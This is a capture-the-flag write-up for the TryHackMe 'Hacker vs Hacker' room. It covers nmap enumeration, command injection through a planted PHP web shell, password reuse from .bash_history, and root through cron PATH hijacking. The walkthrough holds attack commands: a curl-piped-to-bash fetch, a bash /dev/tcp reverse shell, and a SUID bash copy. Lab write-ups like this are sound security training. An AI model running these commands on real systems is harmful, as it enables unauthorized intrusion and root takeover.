# **[Room](https://tryhackme.com/room/hackervshacker)**

```
export IP=10.10.162.146
```

---

## Enumeration
---
    nmap -sC -sV 10.10.162.146
```
PORT      STATE    SERVICE         VERSION
  
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  
  | ssh-hostkey: 
  
  |   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
  
  |   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
  
  |_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
  
80/tcp    open     http            Apache httpd 2.4.41 ((Ubuntu))
  
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  
  |_http-title: RecruitSec: Industry Leading Infosec Recruitment
```
## PORT 80
---
![image](https://user-images.githubusercontent.com/100512862/186632835-e07f11e1-3bcb-483d-be48-71879f2a91cd.png)

When we scroll down, there is an upload form which is for uploading CV. At first I try to upload my own php reverse shell file `shell.php` and it successes.

It redirect us to `/upload.php`

![image](https://user-images.githubusercontent.com/100512862/186634990-71f9fca0-0bc2-4bb9-b4bd-8b26754f797b.png)

By viewing the source code we can see the contents of *upload.php*
![image](https://user-images.githubusercontent.com/100512862/186635253-47c60282-c223-44e0-a91b-21327a579bf8.png)

The file goes to `/cvs` and it accepts `pdf` file. Sweet now I can try to upload my reverse shell again with the name of shell.pdf.php. But the message is still the same as before so I assume we can go to `/cvs` and check if our file is there.

So the first file `shell.php` that I uploaded is not there but the second file `shell.pdf.php` is there. Weird, huh?

To my surprise `shell.pdf.php` was already in there by default. By browsing the page, we got this message.
![image](https://user-images.githubusercontent.com/100512862/186636559-c27bdfb0-8e0f-46c1-baf4-abaae6a300f1.png)

If this is not a php reserver shell, I think that it is for **Command Injection**

Let's bruteforce the parameter.
```
ffuf -c -s -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u "http://10.10.162.146/cvs/shell.pdf.php?FUZZ=id" -fw 1
```
And we got `cmd`

![image](https://user-images.githubusercontent.com/100512862/186638471-f6d83a23-7e7f-42ee-8712-45ed2d70ecfc.png)

Let's get a reverse shell.

Since I tried to put some reverse shell script but it didn't work so I decided to just use `curl`

```
10.10.162.146/cvs/shell.pdf.php?cmd=curl $My_IP:8000/rev_shell | bash
```
### My python server tab
![image](https://user-images.githubusercontent.com/100512862/186847311-05265670-92f5-4118-97f1-26d212a6e7f8.png)

### My netcat tab
![image](https://user-images.githubusercontent.com/100512862/186847384-bb87b657-461a-40cc-a434-f605c96d4da8.png)

### My reverse shell script
![image](https://user-images.githubusercontent.com/100512862/186847881-499ed17c-9c9e-43e9-99ac-fcd066c4d153.png)

After we enter that url with the curl command, we will get a shell on the netcat listener that we have set up as user **www-data**

So this is what inside the shell.pdf.php that is already on the target machine

![image](https://user-images.githubusercontent.com/100512862/186848330-ee2edf8c-84c8-49a1-98c8-6550d321c1d9.png)

## Lateral Movement
---

By checking the home directory, we found a user **lachlan** which contains a *user.txt*.
![image](https://user-images.githubusercontent.com/100512862/186849081-704e199f-ee94-4181-ab90-c97e48a50e49.png)

By looking through every file in **lachlan** directory, we see that `.bash_history` contains something which looks like a password for the user **lachlan**

![image](https://user-images.githubusercontent.com/100512862/186850089-1db482bf-fa37-4f3d-966d-09dd2f2f1f2f.png)

### First Case

Let's `su` into **lachlan**

![image](https://user-images.githubusercontent.com/100512862/186850409-c96941ab-e749-4cbd-aa7f-152d0c6f3c85.png)

### Second Case

We can also try to ssh in with the password that we got, but we get this message when we logged in

![image](https://user-images.githubusercontent.com/100512862/186850941-d0e8f874-e6cb-4a62-8912-6fe6607c4527.png)

This is because there is some cron that keep sending this message and kill our shell. Let's check what that cron does with the shell that we just `su` in.

![image](https://user-images.githubusercontent.com/100512862/186851293-57be9439-0d93-47ce-8079-7fd00e448b23.png)

We notice a **PATH** that will come in handy later on, but for now let's analyze the script.

|Command|Explanation|
|-------|-----------|
|`/bin/sleep`|this tell the script to rest for some time|
|`for f in '/bin/ls /dev/pts'`|   this take any session that is in **/dev/pts** and put it into f|
|`do /usr/bin/echo nope > /dev/pts/$f`|   this use **echo** to spit out *nope* to our shell when we log in because whenever we log in through ssh, our session is store in */dev/pts*|
|`pkill -9 -t pts/$f`|    this is the thing that keeps killing our shell through ssh|

So what can we do bypass this cron from killing our session? In ssh man page, `-T:Disable pseudo-terminal allocation`

```
ssh lachlan@$IP -T
```

![image](https://user-images.githubusercontent.com/100512862/186853786-c87719fe-2046-4954-ac42-6cd74a9a4ca7.png)

>w is to check who is on the machine with pty

Our shell don't get kill anymore.

## Privilege Escalation

After running **linpeas**, we see there is an unusual path

![image](https://user-images.githubusercontent.com/100512862/186854705-421aa1f7-c2aa-4780-8900-bd81e9fbd4ba.png)

Let's check this directory

![image](https://user-images.githubusercontent.com/100512862/186854880-a4a24338-12ed-479c-9ae3-0536cad8cc23.png)

We see a **backup.sh** file that is also run in `/etc/cron.d/persistence`

![image](https://user-images.githubusercontent.com/100512862/186855124-f126ff80-8572-4fd5-bd83-5988636330fe.png)

>I don't know if this is a rabbit hole or not, but I can't get any reverse shell to work with that **backup.sh**

But look at the path of every binary that keep killing our shell. One of them doesn't have *absolute* path which is `pkill`. So we can try to exploit it by manipulate the path that pkill will execute with cron

### First Case

We can create a reverse shell with the name **pkill** in `/home/lachlan/bin`

```
echo "bash -c 'bash -i >& /dev/tcp/$My_IP/1234 0>&1'" > pkill; chmod +x pkill
```

On my machine with the netcat listener

![image](https://user-images.githubusercontent.com/100512862/186857156-3ef6ccfd-0db5-4f53-b249-f15ab25a6ef3.png)

### Second Case

In other way, we can just escalate to root without the need of reverse shell. We want cron to execute the fake `pkill` that will copy `/bin/bash` which is owned by root to `/home/lachlan/bin` so that we can execute that `bash` file with root privilege

```
echo "cp /bin/bash /home/lachlan/bin/bash && chmod 4755 /home/lachlan/bin/bash" > pkill; chmod 777 pkill
```
>We copy bash to /lachlan/bin with the name **bash** *not pkill* and give it SUID permission and also executable permission and we put it in the fake **pkill** file that we just created and we give the **pkill** file full permission

After some time, a bash file that we want is copied to `/home/lachlan/bin` with **root** as the owner and executable by everyone

![image](https://user-images.githubusercontent.com/100512862/186859132-e3ba2bff-475f-4432-b465-47e83d1207a9.png)

So we can now use that **bash** file to get root just by typing

```
./bash -p
```

![image](https://user-images.githubusercontent.com/100512862/186859361-2db17de8-a538-450b-b70c-b1a43ebd3316.png)

Finally, let's get our root flag

![image](https://user-images.githubusercontent.com/100512862/186859494-e53c63a2-0093-4504-848b-a75c0f4fe6dc.png)


